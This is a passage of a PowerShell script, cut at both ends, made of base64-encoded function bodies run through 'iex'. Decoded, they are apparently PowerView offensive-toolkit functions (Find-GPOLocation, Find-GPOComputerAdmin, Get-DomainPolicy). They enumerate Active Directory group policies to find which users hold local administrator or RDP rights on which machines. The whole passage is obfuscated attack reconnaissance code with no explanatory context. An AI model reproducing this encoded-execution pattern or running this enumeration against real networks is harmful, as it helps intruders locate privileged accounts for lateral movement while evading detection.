YWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLVBhZ2VTaXplICRQYWdlU2l6ZSB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAkTWVtYmVyb2YgPSAkTnVsbAogICAgICAgICRNZW1iZXJzID0gJE51bGwKICAgICAgICAkR1BPZGlzcGxheU5hbWUgPSAkXy5kaXNwbGF5bmFtZQogICAgICAgICRHUE9uYW1lID0gJF8ubmFtZQogICAgICAgICRHUE9QYXRoID0gJF8uZ3BjZmlsZXN5c3BhdGgKICAgICAgICAkUGFyc2VBcmdzID0gIEB7CiAgICAgICAgICAgICdHcHRUbXBsUGF0aCcgPSAiJEdQT1BhdGhcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mIgogICAgICAgICAgICAnVXNlUFNEcml2ZScgPSAkVXNlUFNEcml2ZQogICAgICAgIH0KICAgICAgICAkSW5mID0gR2V0LUdwdFRtcGwgQFBhcnNlQXJncwogICAgICAgIGlmKCRJbmYuR3JvdXBNZW1iZXJzaGlwKSB7CiAgICAgICAgICAgICRNZW1iZXJvZiA9ICRJbmYuR3JvdXBNZW1iZXJzaGlwIHwgR2V0LU1lbWJlciAqTWVtYmVyb2YgfCBGb3JFYWNoLU9iamVjdCB7ICRJbmYuR3JvdXBNZW1iZXJzaGlwLigkXy5uYW1lKSB9IHwgRm9yRWFjaC1PYmplY3QgeyAkXy50cmltKCcqJykgfQogICAgICAgICAgICAkTWVtYmVycyA9ICRJbmYuR3JvdXBNZW1iZXJzaGlwIHwgR2V0LU1lbWJlciAqTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsgJEluZi5Hcm91cE1lbWJlcnNoaXAuKCRfLm5hbWUpIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLnRyaW0oJyonKSB9CiAgICAgICAgICAgIGlmICgkTWVtYmVycyAtb3IgJE1lbWJlcm9mKSB7CiAgICAgICAgICAgICAgICBpZighJE1lbWJlcm9mKSB7CiAgICAgICAgICAgICAgICAgICAgJE1lbWJlcm9mID0gJ1MtMS01LTMyLTU0NCcKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmKCRSZXNvbHZlU2lkcykgewogICAgICAgICAgICAgICAgICAgICRNZW1iZXJvZiA9ICRNZW1iZXJvZiB8IEZvckVhY2gtT2JqZWN0IHtDb252ZXJ0LVNpZFRvTmFtZSAkX30KICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyA9ICRNZW1iZXJzIHwgRm9yRWFjaC1PYmplY3Qge0NvbnZlcnQtU2lkVG9OYW1lICRffQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYoJE1lbWJlcm9mIC1pc25vdCBbc3lzdGVtLmFycmF5XSkgeyRNZW1iZXJvZiA9IEAoJE1lbWJlcm9mKX0KICAgICAgICAgICAgICAgIGlmKCRNZW1iZXJzIC1pc25vdCBbc3lzdGVtLmFycmF5XSkgeyRNZW1iZXJzID0gQCgkTWVtYmVycyl9CiAgICAgICAgICAgICAgICAkR1BPUHJvcGVydGllcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0dQT0Rpc3BsYXlOYW1lJyA9ICRHUE9EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgICdHUE9OYW1lJyA9ICRHUE9OYW1lCiAgICAgICAgICAgICAgICAgICAgJ0dQT1BhdGgnID0gJEdQT1BhdGgKICAgICAgICAgICAgICAgICAgICAnRmlsdGVycycgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICdNZW1iZXJPZicgPSAkTWVtYmVyb2YKICAgICAgICAgICAgICAgICAgICAnTWVtYmVycycgPSAkTWVtYmVycwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRHUE9Qcm9wZXJ0aWVzCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJFBhcnNlQXJncyA9ICBAewogICAgICAgICAgICAnR3JvdXBzWE1McGF0aCcgPSAiJEdQT1BhdGhcTUFDSElORVxQcmVmZXJlbmNlc1xHcm91cHNcR3JvdXBzLnhtbCIKICAgICAgICAgICAgJ1Jlc29sdmVTaWRzJyA9ICRSZXNvbHZlU2lkcwogICAgICAgICAgICAnVXNlUFNEcml2ZScgPSAkVXNlUFNEcml2ZQogICAgICAgIH0KICAgICAgICBHZXQtR3JvdXBzWE1MIEBQYXJzZUFyZ3MKICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1HUE9Mb2NhdGlvbiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRMb2NhbEdyb3VwID0gJ0FkbWluaXN0cmF0b3JzJywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRVc2VQU0RyaXZlLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgaWYoJFVzZXJOYW1lKSB7CiAgICAgICAgJFVzZXIgPSBHZXQtTmV0VXNlciAtVXNlck5hbWUgJFVzZXJOYW1lIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgJFVzZXJTaWQgPSAkVXNlci5vYmplY3RzaWQKICAgICAgICBpZighJFVzZXJTaWQpIHsgICAgCiAgICAgICAgICAgIFRocm93ICJVc2VyICckVXNlck5hbWUnIG5vdCBmb3VuZCEiCiAgICAgICAgfQogICAgICAgICRUYXJnZXRTaWQgPSAkVXNlclNpZAogICAgICAgICRPYmplY3RTYW1BY2NvdW50TmFtZSA9ICRVc2VyLnNhbWFjY291bnRuYW1lCiAgICAgICAgJE9iamVjdERpc3ROYW1lID0gJFVzZXIuZGlzdGluZ3Vpc2hlZG5hbWUKICAgIH0KICAgIGVsc2VpZigkR3JvdXBOYW1lKSB7CiAgICAgICAgJEdyb3VwID0gR2V0LU5ldEdyb3VwIC1Hcm91cE5hbWUgJEdyb3VwTmFtZSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUZ1bGxEYXRhIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAkR3JvdXBTaWQgPSAkR3JvdXAub2JqZWN0c2lkCiAgICAgICAgaWYoISRHcm91cFNpZCkgeyAgICAKICAgICAgICAgICAgVGhyb3cgIkdyb3VwICckR3JvdXBOYW1lJyBub3QgZm91bmQhIgogICAgICAgIH0KICAgICAgICAkVGFyZ2V0U2lkID0gJEdyb3VwU2lkCiAgICAgICAgJE9iamVjdFNhbUFjY291bnROYW1lID0gJEdyb3VwLnNhbWFjY291bnRuYW1lCiAgICAgICAgJE9iamVjdERpc3ROYW1lID0gJEdyb3VwLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICB9CiAgICBlbHNlIHsKICAgICAgICB0aHJvdyAiLVVzZXJOYW1lIG9yIC1Hcm91cE5hbWUgbXVzdCBiZSBzcGVjaWZpZWQhIgogICAgfQogICAgaWYoJExvY2FsR3JvdXAgLWxpa2UgIipBZG1pbioiKSB7CiAgICAgICAgJExvY2FsU0lEID0gIlMtMS01LTMyLTU0NCIKICAgIH0KICAgIGVsc2VpZiAoICgkTG9jYWxHcm91cCAtbGlrZSAiKlJEUCoiKSAtb3IgKCRMb2NhbEdyb3VwIC1saWtlICIqUmVtb3RlKiIpICkgewogICAgICAgICRMb2NhbFNJRCA9ICJTLTEtNS0zMi01NTUiCiAgICB9CiAgICBlbHNlaWYgKCRMb2NhbEdyb3VwIC1saWtlICJTLTEtNSoiKSB7CiAgICAgICAgJExvY2FsU0lEID0gJExvY2FsR3JvdXAKICAgIH0KICAgIGVsc2UgewogICAgICAgIHRocm93ICJMb2NhbEdyb3VwIG11c3QgYmUgJ0FkbWluaXN0cmF0b3JzJywgJ1JEUCcsIG9yIGEgJ1MtMS01LVgnIHR5cGUgc2lkLiIKICAgIH0KICAgIFdyaXRlLVZlcmJvc2UgIkxvY2FsU2lkOiAkTG9jYWxTSUQiCiAgICBXcml0ZS1WZXJib3NlICJUYXJnZXRTaWQ6ICRUYXJnZXRTaWQiCiAgICBXcml0ZS1WZXJib3NlICJUYXJnZXRPYmplY3REaXN0TmFtZTogJE9iamVjdERpc3ROYW1lIgogICAgaWYoJFRhcmdldFNpZCAtaXNub3QgW3N5c3RlbS5hcnJheV0pIHsgJFRhcmdldFNpZCA9IEAoJFRhcmdldFNpZCkgfQogICAgJFRhcmdldFNpZCArPSBHZXQtTmV0R3JvdXAgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1QYWdlU2l6ZSAkUGFnZVNpemUgLVVzZXJOYW1lICRPYmplY3RTYW1BY2NvdW50TmFtZSAtUmF3U2lkcwogICAgaWYoJFRhcmdldFNpZCAtaXNub3QgW3N5c3RlbS5hcnJheV0pIHsgJFRhcmdldFNpZCA9IEAoJFRhcmdldFNpZCkgfQogICAgV3JpdGUtVmVyYm9zZSAiRWZmZWN0aXZlIHRhcmdldCBzaWRzOiAkVGFyZ2V0U2lkIgogICAgJEdQT0dyb3VwQXJncyA9ICBAewogICAgICAgICdEb21haW4nID0gJERvbWFpbgogICAgICAgICdEb21haW5Db250cm9sbGVyJyA9ICREb21haW5Db250cm9sbGVyCiAgICAgICAgJ1VzZVBTRHJpdmUnID0gJFVzZVBTRHJpdmUKICAgICAgICAnUGFnZVNpemUnID0gJFBhZ2VTaXplCiAgICB9CiAgICAkR1BPZ3JvdXBzID0gR2V0LU5ldEdQT0dyb3VwIEBHUE9Hcm91cEFyZ3MgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKCRfLm1lbWJlcnMpIHsKICAgICAgICAgICAgJF8ubWVtYmVycyA9ICRfLm1lbWJlcnMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmKCRfIC1tYXRjaCAiUy0xLTUiKSB7CiAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIENvbnZlcnQtTmFtZVRvU2lkIC1PYmplY3ROYW1lICRfIC1Eb21haW4gJERvbWFpbgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRfLm1lbWJlcnMgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7ICRfLm1lbWJlcnMgPSBAKCRfLm1lbWJlcnMpIH0KICAgICAgICAgICAgaWYoJF8ubWVtYmVyb2YgLWlzbm90IFtzeXN0ZW0uYXJyYXldKSB7ICRfLm1lbWJlcm9mID0gQCgkXy5tZW1iZXJvZikgfQogICAgICAgICAgICBpZigkXy5tZW1iZXJzKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmKCAoQ29tcGFyZS1PYmplY3QgLVJlZmVyZW5jZU9iamVjdCAkXy5tZW1iZXJzIC1EaWZmZXJlbmNlT2JqZWN0ICRUYXJnZXRTaWQgLUluY2x1ZGVFcXVhbCAtRXhjbHVkZURpZmZlcmVudCkgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5tZW1iZXJvZiAtY29udGFpbnMgJExvY2FsU2lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1EZWJ1ZyAiRXJyb3IgY29tcGFyaW5nIG1lbWJlcnMgYW5kICRUYXJnZXRTaWQgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFdyaXRlLVZlcmJvc2UgIkdQT2dyb3VwczogJEdQT2dyb3VwcyIKICAgICRQcm9jZXNzZWRHVUlEcyA9IEB7fQogICAgJEdQT2dyb3VwcyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRHUE9ndWlkID0gJF8uR1BPTmFtZQogICAgICAgIGlmKCAtbm90ICRQcm9jZXNzZWRHVUlEc1skR1BPZ3VpZF0gKSB7CiAgICAgICAgICAgICRHUE9uYW1lID0gJF8uR1BPRGlzcGxheU5hbWUKICAgICAgICAgICAgJEZpbHRlcnMgPSAkXy5GaWx0ZXJzCiAgICAgICAgICAgIEdldC1OZXRPVSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUdVSUQgJEdQT2d1aWQgLUZ1bGxEYXRhIC1QYWdlU2l6ZSAkUGFnZVNpemUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZigkRmlsdGVycykgewogICAgICAgICAgICAgICAgICAgICRPVUNvbXB1dGVycyA9IEdldC1OZXRDb21wdXRlciAtQURTcGF0aCAkXy5BRFNwYXRoIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplIHwgV2hlcmUtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJF8uYWRzcGF0aCAtbWF0Y2ggKCRGaWx0ZXJzLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLmRuc2hvc3RuYW1lIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPVUNvbXB1dGVycyA9IEdldC1OZXRDb21wdXRlciAtQURTcGF0aCAkXy5BRFNwYXRoIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRHUE9Mb2NhdGlvbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRHUE9Mb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3ROYW1lJyAkT2JqZWN0RGlzdE5hbWUKICAgICAgICAgICAgICAgICRHUE9Mb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9uYW1lJyAkR1BPbmFtZQogICAgICAgICAgICAgICAgJEdQT0xvY2F0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT2d1aWQnICRHUE9ndWlkCiAgICAgICAgICAgICAgICAkR1BPTG9jYXRpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29udGFpbmVyTmFtZScgJF8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICRHUE9Mb2NhdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlcnMnICRPVUNvbXB1dGVycwogICAgICAgICAgICAgICAgJEdQT0xvY2F0aW9uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFByb2Nlc3NlZEdVSURzWyRHUE9ndWlkXSA9ICRUcnVlCiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1HUE9Db21wdXRlckFkbWluIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9VTmFtZSwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExvY2FsR3JvdXAgPSAnQWRtaW5pc3RyYXRvcnMnLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZVBTRHJpdmUsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBwcm9jZXNzIHsKICAgICAgICBpZighJENvbXB1dGVyTmFtZSAtYW5kICEkT1VOYW1lKSB7CiAgICAgICAgICAgIFRocm93ICItQ29tcHV0ZXJOYW1lIG9yIC1PVU5hbWUgbXVzdCBiZSBwcm92aWRlZCIKICAgICAgICB9CiAgICAgICAgaWYoJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkQ29tcHV0ZXJzID0gR2V0LU5ldENvbXB1dGVyIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZSAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUZ1bGxEYXRhIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICAgICAgaWYoISRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICJDb21wdXRlciAkQ29tcHV0ZXIgaW4gZG9tYWluICckRG9tYWluJyBub3QgZm91bmQhIgogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2goJENvbXB1dGVyIGluICRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRETiA9ICRDb21wdXRlci5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgJFRhcmdldE9VcyA9ICRETi5zcGxpdCgiLCIpIHwgRm9yZWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmKCRfLnN0YXJ0c3dpdGgoIk9VPSIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRETi5zdWJzdHJpbmcoJEROLmluZGV4b2YoJF8pKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFRhcmdldE9VcyA9IEAoJE9VTmFtZSkKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGFyZ2V0IE9VczogJFRhcmdldE9VcyIKICAgICAgICAkVGFyZ2V0T1VzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPVSA9ICRfCiAgICAgICAgICAgICRHUE9ncm91cHMgPSBHZXQtTmV0T1UgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1BRFNwYXRoICRfIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplIHwgRm9yZWFjaC1PYmplY3QgeyAKICAgICAgICAgICAgICAgICRfLmdwbGluay5zcGxpdCgiXVsiKSB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJF8uc3RhcnRzd2l0aCgiTERBUCIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRfLnNwbGl0KCI7IilbMF0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1BPR3JvdXBBcmdzID0gIEB7CiAgICAgICAgICAgICAgICAgICAgJ0RvbWFpbicgPSAkRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJ0RvbWFpbkNvbnRyb2xsZXInID0gJERvbWFpbkNvbnRyb2xsZXIKICAgICAgICAgICAgICAgICAgICAnQURTcGF0aCcgPSAkXwogICAgICAgICAgICAgICAgICAgICdVc2VQU0RyaXZlJyA9ICRVc2VQU0RyaXZlCiAgICAgICAgICAgICAgICAgICAgJ1BhZ2VTaXplJyA9ICRQYWdlU2l6ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgR2V0LU5ldEdQT0dyb3VwIEBHUE9Hcm91cEFyZ3MKICAgICAgICAgICAgfQogICAgICAgICAgICAkR1BPZ3JvdXBzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1BPID0gJF8KICAgICAgICAgICAgICAgICRHUE8ubWVtYmVycyB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LUFET2JqZWN0IC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAkXyAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT1UnICRPVQogICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckFkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPLkdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJEdQTy5HUE9QYXRoCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0TmFtZScgJE9iamVjdC5uYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRfCiAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJCgkT2JqZWN0LnNhbWFjY291bnR0eXBlIC1ub3RtYXRjaCAnODA1MzA2MzY4JykKICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiAKICAgICAgICAgICAgICAgICAgICBpZigkUmVjdXJzZSAtYW5kICRHUE9Db21wdXRlckFkbWluLmlzR3JvdXApIHsKICAgICAgICAgICAgICAgICAgICAgICAgR2V0LU5ldEdyb3VwTWVtYmVyIC1TSUQgJF8gLUZ1bGxEYXRhIC1SZWN1cnNlIC1QYWdlU2l6ZSAkUGFnZVNpemUgfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRE4gPSAkXy5kaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICRNZW1iZXJETi5zdWJTdHJpbmcoJE1lbWJlckROLkluZGV4T2YoIkRDPSIpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uc2FtQWNjb3VudFR5cGUgLW5lICI4MDUzMDYzNjgiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzR3JvdXAgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzR3JvdXAgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zYW1BY2NvdW50TmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gJF8uc2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gQ29udmVydC1TaWRUb05hbWUgJF8uY24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9ICRfLmNuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckFkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09VJyAkT1UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckFkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPLkdQT0Rpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9QYXRoJyAkR1BPLkdQT1BhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckFkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdE5hbWUnICRNZW1iZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RETicgJE1lbWJlckROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPQ29tcHV0ZXJBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3RTSUQnICRfLm9iamVjdHNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0NvbXB1dGVyQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJE1lbWJlcklzR3JvdXAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Db21wdXRlckFkbWluIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblBvbGljeSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCJEb21haW4iLCJEQyIpXQogICAgICAgICRTb3VyY2UgPSJEb21haW4iLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVTaWRzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZVBTRHJpdmUKICAgICkKICAgIGlmKCRTb3VyY2UgLWVxICJEb21haW4iKSB7CiAgICAgICAgJEdQTyA9IEdldC1OZXRHUE8gLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1HUE9uYW1lICJ7MzFCMkYzNDAtMDE2RC0xMUQyLTk0NUYtMDBDMDRGQjk4NEY5fS